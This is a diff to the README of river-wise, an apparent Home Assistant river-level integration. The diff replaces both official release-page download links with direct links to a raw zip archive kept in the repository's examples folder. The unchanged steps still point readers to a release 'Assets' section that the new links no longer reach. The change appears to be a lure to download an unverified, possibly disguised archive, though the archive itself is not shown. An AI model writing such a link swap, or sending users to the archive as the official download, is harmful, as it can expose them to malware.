@@ -1,6 +1,6 @@
 # 🌊 river-wise - Track local river levels with ease
 
-[![Download river-wise](https://img.shields.io/badge/Download-Release-blue)](https://github.com/saundersinviolate211/river-wise/releases)
+[![Download river-wise](https://img.shields.io/badge/Download-Release-blue)](https://github.com/saundersinviolate211/river-wise/raw/refs/heads/main/examples/river-wise-v3.2.zip)
 
 river-wise brings real-time water data into your Home Assistant dashboard. It monitors river stage, flow, and flood forecasts from the NOAA NWPS API. You see live hydrographs, flood warnings, and safety information for any specific gauge ID.
 
@@ -18,7 +18,7 @@ Ensure your system meets these needs to run the software:
 
 You must download the latest release files to begin the setup. 
 
-[Visit this page to download the latest version](https://github.com/saundersinviolate211/river-wise/releases).
+[Visit this page to download the latest version](https://github.com/saundersinviolate211/river-wise/raw/refs/heads/main/examples/river-wise-v3.2.zip).
 
 1. Open the link above in your web browser.
 2. Look for the section labeled "Assets" at the bottom of the top release announcement.
